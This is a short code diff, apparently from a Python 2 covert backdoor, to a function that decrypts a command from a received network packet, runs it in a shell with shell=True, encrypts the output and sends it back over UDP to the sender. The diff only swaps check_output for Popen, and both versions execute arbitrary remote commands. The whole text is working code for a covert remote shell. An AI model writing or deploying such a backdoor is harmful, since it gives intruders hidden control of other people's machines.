@@ -22,11 +22,8 @@ def runCommand(packet):
   encryptedData = packet['Raw'].load
   data = crypto.decrypt(encryptedData)
   print "Running command " + data
-  output = ""
-  try:
-    output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
-  except subprocess.CalledProcessError as e:
-    output = e.output
+  output = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+  output = output.stdout.read() + output.stderr.read()
   encryptedOutput = crypto.encrypt(output)
   packet = IP(dst=packet[0][1].src)/UDP(dport=int(args.sourcePort), sport=int(args.destPort))/Raw(load=encryptedOutput)
   time.sleep(0.1)
